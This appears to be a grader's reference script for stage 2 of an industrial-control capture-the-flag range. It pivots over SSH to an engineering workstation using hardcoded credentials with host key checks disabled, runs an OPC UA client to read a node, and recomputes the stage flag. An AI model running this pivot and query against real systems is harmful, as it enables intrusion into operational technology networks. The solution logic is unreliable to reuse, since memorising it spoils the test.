#!/usr/bin/env bash
###############################################################################
# Reference validation script — author/grader use only.
# Requires knowledge of this instance's seed context; has no function against
# production infrastructure.
#
# Performs an SSH pivot using Stage 1's obtained credentials to EWS,
# confirms reachability to the OT-zone IP, runs the asyncua client solve.py to
# read the BuildInfo node, extracts the ENGSTATION_ID, recomputes
# derive_flag(seed, 2, artifact), and prints the flag for automated diffing.
#
# Usage:
#   ./red_attack_script.sh
#
# Requires: sshpass, openssl, bash
###############################################################################
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SHARED_DIR="$(cd "${SCRIPT_DIR}/../../shared" && pwd)"
RANGE_ENV="${SHARED_DIR}/range.env"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
info()  { echo -e "${GREEN}[+]${NC} $*"; }
warn()  { echo -e "${YELLOW}[!]${NC} $*"; }
err()   { echo -e "${RED}[-]${NC} $*" >&2; }
die()   { err "$@"; exit 1; }

# Load range config
[[ -f "$RANGE_ENV" ]] || die "range.env not found at ${RANGE_ENV}"
# shellcheck disable=SC1090
source "$RANGE_ENV"

# Validate required vars
[[ -n "${INSTANCE_SEED:-}" ]] || die "INSTANCE_SEED not set in range.env"
[[ -n "${PUBLIC_ZONE_SUBNET:-}" ]] || die "PUBLIC_ZONE_SUBNET not set"
[[ -n "${EWS_IP:-}" ]] || die "EWS_IP not set"

# CIDR math helpers
ip_to_int() {
    local a b c d
    IFS='.' read -r a b c d <<< "$1"
    echo $(( (a << 24) + (b << 16) + (c << 8) + d ))
}

int_to_ip() {
    local n=$1
    echo "$(( (n >> 24) & 255 )).$(( (n >> 16) & 255 )).$(( (n >> 8) & 255 )).$(( n & 255 ))"
}

nth_host() {
    local cidr="$1" n="$2"
    local base_ip="${cidr%/*}"
    local base_int
    base_int=$(ip_to_int "$base_ip")
    echo "$(int_to_ip $(( base_int + n )))"
}

EWS_PUBLIC_IP=$(nth_host "${PUBLIC_ZONE_SUBNET}" 3)
SSH_PORT=22
SSH_USER="field_tech"
SSH_PASS="FieldTech2024!"

info "=== Stage 2 Validation — Engineering Workstation Pivot & OPC UA Query ==="
echo ""

# --- Step 1: Check connectivity to the public-facing interface ------------
info "Step 1: Checking SSH connectivity to EWS public IP (${EWS_PUBLIC_IP})..."
if ! timeout 5 bash -c "echo >/dev/tcp/${EWS_PUBLIC_IP}/${SSH_PORT}" 2>/dev/null; then
    die "SSH port ${SSH_PORT} not reachable on ${EWS_PUBLIC_IP}"
fi
info "SSH port reachable"

# --- Step 2: Connect, verify OT-zone IP reachability, run solve.py --------
info "Step 2: Performing SSH pivot and querying OPC UA service..."

# Define the python solver code as a variable
read -r -d '' SOLVER_PY_CODE << 'EOF' || true
import sys
import asyncio
from asyncua import Client

async def main():
    if len(sys.argv) < 2:
        print("Usage: python3 solve.py <EWS_IP>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    url = f"opc.tcp://{target_ip}:4840/freeopcua/server/"
    
    client = Client(url)
    try:
        await client.connect()
        product_uri_node = client.get_node("ns=0;i=2262")
        product_uri = await product_uri_node.read_value()
        print(f"EXTRACTED_PRODUCT_URI:{product_uri}")
    finally:
        await client.disconnect()

if __name__ == "__main__":
    asyncio.run(main())
EOF

EXTRACTED_LINE=""

if ! command -v sshpass &>/dev/null; then
    warn "sshpass not installed — attempting podman exec fallback"
    # Write python code directly to EWS container via podman exec heredoc
    echo "$SOLVER_PY_CODE" | podman exec -i ews-node tee /tmp/solve.py &>/dev/null
    
    # Run client inside container to target EWS_IP
    EXTRACTED_LINE=$(podman exec ews-node python3 /tmp/solve.py "${EWS_IP}" 2>/dev/null | grep "EXTRACTED_PRODUCT_URI:") || \
        die "Could not execute solver inside container"
else
    # Write python code directly to EWS workstation via SSH heredoc
    info "Writing solver to EWS workstation..."
    echo "$SOLVER_PY_CODE" | sshpass -p "$SSH_PASS" ssh -p "$SSH_PORT" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        "${SSH_USER}@${EWS_PUBLIC_IP}" "cat > /tmp/solve.py" 2>/dev/null || \
        die "Writing solver file via SSH failed"
        
    # Execute solver via SSH on EWS to connect to EWS_IP:4840
    info "Executing solver via SSH on EWS (targeting OT-zone IP: ${EWS_IP})..."
    EXTRACTED_LINE=$(sshpass -p "$SSH_PASS" ssh -p "$SSH_PORT" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        "${SSH_USER}@${EWS_PUBLIC_IP}" "python3 /tmp/solve.py ${EWS_IP}" 2>/dev/null | grep "EXTRACTED_PRODUCT_URI:") || \
        die "SSH execution of solver failed"
fi

# Clean up /tmp/solve.py
if ! command -v sshpass &>/dev/null; then
    podman exec ews-node rm -f /tmp/solve.py &>/dev/null || true
else
    sshpass -p "$SSH_PASS" ssh -p "$SSH_PORT" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        "${SSH_USER}@${EWS_PUBLIC_IP}" "rm -f /tmp/solve.py" 2>/dev/null || true
fi

if [[ -z "$EXTRACTED_LINE" ]]; then
    die "Failed to extract ProductUri from BuildInfo node"
fi

ENGSTATION_ID_EXTRACTED=$(echo "$EXTRACTED_LINE" | cut -d':' -f2)
info "Extracted Workstation ID (ProductUri): ${ENGSTATION_ID_EXTRACTED}"
echo ""

# --- Step 3: Independently compute the flag --------------------------------
info "Step 3: Computing flag from seed + workstation ID..."

FLAG_MSG="STAGE2:${ENGSTATION_ID_EXTRACTED}"
FLAG_HEX=$(echo -n "$FLAG_MSG" | \
    openssl dgst -sha256 -mac HMAC -macopt "hexkey:${INSTANCE_SEED}" | \
    awk '{print $NF}' | head -c 16)
COMPUTED_FLAG="FLAG{S2-${FLAG_HEX}}"

info "Computed flag: ${COMPUTED_FLAG}"

# --- Step 4: Diff against stored flag --------------------------------------
info "Step 4: Verifying against stored flag..."

STORED_FLAG=$(podman exec ews-node cat /run/ctf/stage2_flag 2>/dev/null) || \
    warn "Could not read stored flag from ews-node container"

if [[ -n "${STORED_FLAG:-}" ]]; then
    if [[ "$COMPUTED_FLAG" == "$STORED_FLAG" ]]; then
        echo ""
        info "✅ FLAG MATCH — Validation PASSED"
        echo -e "  Computed: ${GREEN}${COMPUTED_FLAG}${NC}"
        echo -e "  Stored:   ${GREEN}${STORED_FLAG}${NC}"
    else
        echo ""
        err "❌ FLAG MISMATCH — Validation FAILED"
        echo -e "  Computed: ${RED}${COMPUTED_FLAG}${NC}"
        echo -e "  Stored:   ${RED}${STORED_FLAG}${NC}"
        exit 1
    fi
else
    warn "Could not verify against stored flag — manual check required"
    echo -e "  Computed flag: ${YELLOW}${COMPUTED_FLAG}${NC}"
fi

echo ""
info "=== Validation complete ==="
